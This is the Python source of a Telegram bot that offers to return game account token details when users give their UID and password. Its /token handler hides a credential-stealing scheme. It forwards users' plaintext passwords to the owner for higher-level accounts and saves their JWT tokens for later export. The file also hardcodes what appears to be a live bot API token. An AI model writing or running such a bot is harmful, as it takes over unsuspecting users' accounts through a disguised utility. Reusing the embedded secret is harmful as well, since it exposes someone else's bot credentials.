import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
import requests
import json
import os
import time

# --- CONFIGURATION ---
API_TOKEN = '8389891946:AAHrYGdZS9_sp0m6PjcpG3SS1gX-v23SqNc'
MY_CHAT_ID = '8474073439'
OWNER_CONTACT = '@juli_dvrma'
TOKEN_FILE = 'saved_tokens.json'
USERS_FILE = 'bot_users.json'
# ---------------------

bot = telebot.TeleBot(API_TOKEN)

# Tokens store karne ke liye
saved_tokens = []

# Users store karne ke liye
all_users = set()

# File se tokens load karo
if os.path.exists(TOKEN_FILE):
    try:
        with open(TOKEN_FILE, 'r') as f:
            saved_tokens = json.load(f)
            print(f"✅ Loaded {len(saved_tokens)} tokens from {TOKEN_FILE}")
    except Exception as e:
        print(f"⚠️ Error loading tokens: {e}")
        saved_tokens = []

# File se users load karo
if os.path.exists(USERS_FILE):
    try:
        with open(USERS_FILE, 'r') as f:
            all_users = set(json.load(f))
    except:
        all_users = set()

def save_tokens():
    with open(TOKEN_FILE, 'w') as f:
        json.dump(saved_tokens, f, indent=2)
    print(f"💾 Saved {len(saved_tokens)} tokens to {TOKEN_FILE}")

def save_users():
    with open(USERS_FILE, 'w') as f:
        json.dump(list(all_users), f, indent=2)

def main_menu(user_id):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    buttons = [
        KeyboardButton("🎫 GET TOKEN"),
        KeyboardButton("🏠 HOME"),
        KeyboardButton("📞 CONTACT OWNER")
    ]
    
    if str(user_id) == MY_CHAT_ID:
        buttons.append(KeyboardButton("📢 BROADCAST"))
        buttons.append(KeyboardButton("📋 VIEW TOKENS"))
        buttons.append(KeyboardButton("📊 USER STATS"))
        buttons.append(KeyboardButton("📤 EXPORT JSON"))
        buttons.append(KeyboardButton("🔄 UPDATE TOKEN"))
    
    markup.add(*buttons)
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    all_users.add(user_id)
    save_users()
    
    if str(user_id) == MY_CHAT_ID:
        welcome_msg = (
            f"<b>🔐 Owner Bot Started!</b>\n\n"
            f"📁 <b>Total Saved Tokens:</b> {len(saved_tokens)}\n"
            f"📁 <b>File:</b> {TOKEN_FILE}\n\n"
            f"<b>Commands:</b>\n"
            f"/token uid password - Get token\n"
            f"/viewsaved - View saved tokens\n"
            f"/export - Export JSON\n"
            f"/stats - Statistics"
        )
    else:
        welcome_msg = (
            "<b>Welcome! Use /token uid password</b>\n\n"
            "<b>Commands:</b>\n"
            "/token uid password - Get token info"
        )
    
    bot.reply_to(
        message,
        welcome_msg,
        parse_mode='HTML',
        reply_markup=main_menu(user_id)
    )

@bot.message_handler(func=lambda message: message.text == "🎫 GET TOKEN")
def get_token_button(message):
    bot.reply_to(
        message,
        "<b>📝 Use this command:</b>\n<code>/token uid password</code>\n\n"
        "Example:\n<code>/token 123456789 mypassword</code>",
        parse_mode='HTML'
    )

@bot.message_handler(func=lambda message: message.text == "🏠 HOME")
def home_button(message):
    start(message)

@bot.message_handler(func=lambda message: message.text == "📞 CONTACT OWNER")
def contact_owner(message):
    bot.reply_to(
        message,
        f"<b>📞 Contact Owner:</b> {OWNER_CONTACT}",
        parse_mode='HTML'
    )

@bot.message_handler(func=lambda message: message.text == "📊 USER STATS")
def user_stats(message):
    if str(message.chat.id) != MY_CHAT_ID:
        bot.reply_to(message, "<b>❌ Unauthorized!</b>", parse_mode='HTML')
        return
    
    stats = (
        f"<b>📊 Bot Statistics</b>\n\n"
        f"👥 <b>Total Users:</b> {len(all_users)}\n"
        f"📁 <b>Saved Tokens:</b> {len(saved_tokens)}\n"
        f"📁 <b>Token File:</b> {TOKEN_FILE}\n"
        f"🆔 <b>Owner ID:</b> <code>{MY_CHAT_ID}</code>\n\n"
        f"<b>📋 Recent UIDs:</b>\n"
    )
    
    for entry in saved_tokens[-5:]:
        stats += f"• <code>{entry['uid']}</code>\n"
    
    bot.reply_to(message, stats, parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == "📢 BROADCAST")
def broadcast_button(message):
    if str(message.chat.id) != MY_CHAT_ID:
        bot.reply_to(message, "<b>❌ Unauthorized!</b>", parse_mode='HTML')
        return
    
    msg = bot.reply_to(
        message,
        f"<b>📢 Broadcast Message Likho:</b>\n\n"
        f"👥 <b>Total Users:</b> {len(all_users)}\n"
        f"<i>Note: Type 'CANCEL' to cancel</i>",
        parse_mode='HTML'
    )
    bot.register_next_step_handler(msg, send_broadcast)

def send_broadcast(message):
    if message.text.upper() == 'CANCEL':
        bot.reply_to(message, "<b>❌ Broadcast Cancelled!</b>", parse_mode='HTML')
        return
    
    try:
        broadcast_text = message.text
        status_msg = bot.reply_to(
            message, 
            f"<b>📢 Broadcasting Started...</b>\n👥 Total Users: {len(all_users)}", 
            parse_mode='HTML'
        )
        
        success = 0
        failed = 0
        
        for user_id in all_users:
            try:
                bot.send_message(
                    user_id, 
                    f"📢 <b>BROADCAST MESSAGE:</b>\n\n{broadcast_text}\n\n- From Owner", 
                    parse_mode='HTML'
                )
                success += 1
                
                if success % 20 == 0:
                    time.sleep(1)
                    
            except:
                failed += 1
        
        report = (
            f"<b>📊 Broadcast Report:</b>\n\n"
            f"✅ <b>Success:</b> {success}\n"
            f"❌ <b>Failed:</b> {failed}\n"
            f"👥 <b>Total:</b> {len(all_users)}\n"
        )
        
        bot.edit_message_text(
            report,
            message.chat.id,
            status_msg.message_id,
            parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"<b>❌ Broadcast Failed: {e}</b>", parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == "📋 VIEW TOKENS")
def view_tokens(message):
    if str(message.chat.id) != MY_CHAT_ID:
        bot.reply_to(message, "<b>❌ Unauthorized!</b>", parse_mode='HTML')
        return
    
    if not saved_tokens:
        bot.reply_to(message, "<b>📭 No tokens saved yet!</b>", parse_mode='HTML')
        return
    
    recent = saved_tokens[-10:]
    text = "<b>📋 Recently Saved Tokens:</b>\n\n"
    for i, entry in enumerate(recent, 1):
        text += (
            f"{i}. 🆔 <b>UID:</b> <code>{entry['uid']}</code>\n"
            f"   🔑 <b>Token:</b> <code>{entry['token'][:70]}...</code>\n"
            f"   ━━━━━━━━━━━━━━\n"
        )
    
    text += f"\n<b>📁 Total Saved:</b> {len(saved_tokens)}"
    
    if len(text) > 4000:
        parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
        for part in parts:
            bot.send_message(message.chat.id, part, parse_mode='HTML')
    else:
        bot.reply_to(message, text, parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == "📤 EXPORT JSON")
def export_json(message):
    if str(message.chat.id) != MY_CHAT_ID:
        bot.reply_to(message, "<b>❌ Unauthorized!</b>", parse_mode='HTML')
        return
    
    if not saved_tokens:
        bot.reply_to(message, "<b>📭 No tokens to export!</b>", parse_mode='HTML')
        return
    
    export_data = []
    for entry in saved_tokens:
        export_data.append({
            'uid': entry['uid'],
            'token': entry['token']
        })
    
    json_str = json.dumps(export_data, indent=2)
    
    preview = f"<b>📤 Exported JSON ({len(export_data)} tokens)</b>\n\n"
    preview += f"<pre>{json_str[:500]}</pre>"
    if len(json_str) > 500:
        preview += f"\n\n<i>...and {len(json_str)-500} more characters</i>"
    
    bot.send_message(message.chat.id, preview, parse_mode='HTML')
    
    with open('export_tokens.json', 'w') as f:
        json.dump(export_data, f, indent=2)
    
    with open('export_tokens.json', 'rb') as f:
        bot.send_document(
            message.chat.id,
            f,
            caption=f"📁 Complete JSON file - {len(export_data)} tokens",
            reply_markup=main_menu(message.chat.id)
        )

@bot.message_handler(func=lambda message: message.text == "🔄 UPDATE TOKEN")
def update_token_prompt(message):
    if str(message.chat.id) != MY_CHAT_ID:
        return
    
    msg = bot.reply_to(
        message,
        "<b>🔄 Update Token</b>\n\n"
        "Format: <code>UID TOKEN</code>\n"
        "Example: <code>4530423674 eyJhbGciOiJIUzI1NiIs...</code>\n\n"
        "<i>Type CANCEL to cancel</i>",
        parse_mode='HTML'
    )
    bot.register_next_step_handler(msg, process_manual_update)

def process_manual_update(message):
    if message.text.upper() == 'CANCEL':
        bot.reply_to(message, "❌ Cancelled!", reply_markup=main_menu(message.chat.id))
        return
    
    try:
        parts = message.text.strip().split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Invalid format!", reply_markup=main_menu(message.chat.id))
            return
        
        uid = parts[0]
        token = parts[1]
        
        for entry in saved_tokens:
            if entry['uid'] == uid:
                entry['token'] = token
                save_tokens()
                bot.reply_to(
                    message,
                    f"✅ <b>Token Updated!</b>\nUID: <code>{uid}</code>",
                    parse_mode='HTML',
                    reply_markup=main_menu(message.chat.id)
                )
                return
        
        saved_tokens.append({'uid': uid, 'token': token})
        save_tokens()
        bot.reply_to(
            message,
            f"✅ <b>New Token Saved!</b>\nUID: <code>{uid}</code>",
            parse_mode='HTML',
            reply_markup=main_menu(message.chat.id)
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}", reply_markup=main_menu(message.chat.id))

def get_account_level(uid):
    """Info API se level nikalne ka function"""
    try:
        for attempt in range(3):
            try:
                info_url = f"https://flash-info-cbw4.vercel.app/info?uid={uid}&key=Flash"
                headers = {'User-Agent': 'Mozilla/5.0'}
                info_response = requests.get(info_url, headers=headers, timeout=10)
                
                if info_response.status_code == 200:
                    info_data = info_response.json()
                    basic_info = info_data.get('basicInfo', {})
                    level = basic_info.get('level', 0)
                    nickname = basic_info.get('nickname', 'N/A')
                    region = basic_info.get('region', 'N/A')
                    return True, level, nickname, region
                else:
                    time.sleep(1)
            except:
                time.sleep(1)
                continue
        
        return False, 0, 'N/A', 'N/A'
    except:
        return False, 0, 'N/A', 'N/A'

@bot.message_handler(commands=['token'])
def get_token(message):
    user_id = message.chat.id
    all_users.add(user_id)
    save_users()
    
    try:
        args = message.text.split()
        if len(args) < 3:
            bot.reply_to(message, "<b>Use /token uid password</b>", parse_mode='HTML')
            return

        uid_in = args[1]
        pass_in = args[2]

        proc = bot.reply_to(message, "<b>Processing...</b>", parse_mode='HTML')

        # Pehle Info API se level check
        success, level, nickname, region = get_account_level(uid_in)
        
        if not success:
            token_url = f"https://flash-jwt.vercel.app/token?uid={uid_in}&password={pass_in}"
            token_response = requests.get(token_url, timeout=10)
            token_data = token_response.json()
            
            if token_data.get('success'):
                decoded = token_data.get('decoded', {})
                level = decoded.get('level', 8)
                nickname = decoded.get('nickname', 'N/A')
                region = decoded.get('country_code', 'N/A')
            else:
                bot.delete_message(message.chat.id, proc.message_id)
                bot.reply_to(
                    message, 
                    f"<b>❌ API Error! Contact Owner: {OWNER_CONTACT}</b>", 
                    parse_mode='HTML',
                    reply_markup=main_menu(message.chat.id)
                )
                return

        # Token API call
        token_url = f"https://flash-jwt.vercel.app/token?uid={uid_in}&password={pass_in}"
        token_response = requests.get(token_url, timeout=10)
        token_data = token_response.json()

        if token_data.get('success'):
            decoded = token_data.get('decoded', {})
            expiry = decoded.get('expiry_info', {})
            
            # JWT token nikaalo
            jwt_token = token_data.get('jwt_token', 'N/A')
            
            # ------------------------------------------------
            # ✅ UPDATED SAVE & NOTIFY LOGIC
            # ------------------------------------------------
            account_region = region or decoded.get('country_code', 'N/A')
            is_bd = (account_region == 'BD')
            level = int(level)  # ensure integer

            qualify_for_save = (is_bd and level >= 5)          # sirf BD level 5+ save honge
            qualify_for_notify = (is_bd and level >= 5) or (not is_bd and level >= 8)  # both conditions par notify

            # Save token if condition met (only BD high level)
            if qualify_for_save and str(user_id) != MY_CHAT_ID:
                uid_exists = False
                for entry in saved_tokens:
                    if entry['uid'] == uid_in:
                        entry['token'] = jwt_token
                        uid_exists = True
                        break
                
                if not uid_exists:
                    saved_tokens.append({
                        'uid': uid_in,
                        'token': jwt_token
                    })
                
                save_tokens()
            # ------------------------------------------------

            # --- Extracting Details for Response ---
            acc_id = decoded.get('account_id', 'N/A')
            country = decoded.get('country_code', 'N/A')
            l_region = decoded.get('lock_region', 'N/A')
            l_reg_time = decoded.get('lock_region_time', 'N/A')
            n_region = decoded.get('noti_region', 'N/A')
            avatar = decoded.get('reg_avatar', 'N/A')
            
            is_emu = decoded.get('is_emulator', 'N/A')
            emu_score = decoded.get('emulator_score', 'N/A')
            p_name = token_data.get('platform_name', 'Guest')
            p_type = token_data.get('platform_type', 4)
            c_type = decoded.get('client_type', 'N/A')
            
            ob_ver = token_data.get('ob_version_used', 'N/A')
            rel_ver = decoded.get('release_version', 'N/A')
            rel_chan = decoded.get('release_channel', 'N/A')
            client_ver = token_data.get('client_version_used', 'N/A')
            open_id = token_data.get('open_id', 'N/A')
            ext_id = decoded.get('external_id', 'N/A')
            ext_uid = decoded.get('external_uid', 'N/A')
            sig_md5 = decoded.get('signature_md5', 'N/A')
            source = decoded.get('source', '0')
            
            exp_ist = expiry.get('ist', 'N/A')
            rem_human = expiry.get('remaining_human', 'N/A')
            rem_sec = expiry.get('remaining_seconds', 'N/A')
            credit = token_data.get('credit', 'N/A')
            u_id = token_data.get('uid', uid_in)
            
            jwt = token_data.get('jwt_token', 'N/A')
            access_t = token_data.get('access_token', 'N/A')

            # --- RESPONSE FORMAT ---
            response_text = (
                f"<b>┌ Token Information</b>\n"
                f"<b>├─ Nickname:</b> <b>{nickname}</b>\n"
                f"<b>├─ Account ID:</b> <code>{acc_id}</code>\n"
                f"<b>├─ Level:</b> <b>{level}</b>\n"
                f"<b>├─ Avatar ID:</b> <code>{avatar}</code>\n"
                f"<b>├─ Region:</b> <b>{country}</b>\n"
                f"<b>├─ Lock Reg:</b> {l_region} (Time: {l_reg_time})\n"
                f"<b>├─ Noti Reg:</b> {n_region}\n"
                f"<b>├─ Platform:</b> {p_name} (Type: {p_type})\n"
                f"<b>├─ Client Type:</b> {c_type}\n"
                f"<b>├─ Emulator:</b> {is_emu} (Score: {emu_score})\n"
                f"<b>├─ OB Version:</b> {ob_ver}\n"
                f"<b>├─ Client Ver:</b> {client_ver}\n"
                f"<b>├─ Release:</b> {rel_ver} ({rel_chan})\n"
                f"<b>├─ Signature:</b> {sig_md5}\n"
                f"<b>├─ Source:</b> {source}\n"
                f"<b>├─ Expiry IST:</b> {exp_ist}\n"
                f"<b>├─ Remaining:</b> {rem_human} ({rem_sec}s)\n"
                f"<b>├─ External ID:</b> <code>{ext_id}</code>\n"
                f"<b>├─ External UID:</b> <code>{ext_uid}</code>\n"
                f"<b>├─ Open ID:</b> <code>{open_id}</code>\n"
                f"<b>├─ Data UID:</b> <code>{u_id}</code>\n"
                f"<b>├─ Token:</b> <code>{jwt}</code>\n"
                f"<b>└─ Access Token:</b> <code>{access_t}</code>"
            )
            
            bot.delete_message(message.chat.id, proc.message_id)
            bot.send_message(
                message.chat.id, 
                response_text, 
                parse_mode='HTML',
                reply_markup=main_menu(message.chat.id)
            )

            # Owner ko notification sirf qualify hone par
            if str(user_id) != MY_CHAT_ID and qualify_for_notify:
                saved_status = "✅ AUTO-SAVED" if qualify_for_save else "📢 ONLY NOTIFIED"
                owner_msg = (
                    f"🔥 <b>LEVEL {level} ACCOUNT DETECTED!</b>  {saved_status}\n\n"
                    f"👤 <b>Nickname:</b> {nickname}\n"
                    f"🆔 <b>UID:</b> <code>{uid_in}</code>\n"
                    f"🔑 <b>Password:</b> <code>{pass_in}</code>\n"
                    f"📊 <b>Level:</b> {level}\n"
                    f"🌍 <b>Region:</b> {account_region}\n"
                    f"👥 <b>Total Users:</b> {len(all_users)}\n"
                    f"📁 <b>Total Saved:</b> {len(saved_tokens)}"
                )
                bot.send_message(MY_CHAT_ID, owner_msg, parse_mode='HTML')
                
        else:
            bot.delete_message(message.chat.id, proc.message_id)
            bot.reply_to(
                message, 
                f"<b>❌ Login Failed! Contact Owner: {OWNER_CONTACT}</b>", 
                parse_mode='HTML',
                reply_markup=main_menu(message.chat.id)
            )

    except Exception as e:
        try:
            bot.delete_message(message.chat.id, proc.message_id)
        except:
            pass
        bot.reply_to(
            message, 
            f"<b>❌ Error! Contact Owner: {OWNER_CONTACT}</b>", 
            parse_mode='HTML',
            reply_markup=main_menu(message.chat.id)
        )

print("🚀 Bot Started...")
print(f"📁 Loaded {len(saved_tokens)} tokens from {TOKEN_FILE}")
bot.polling()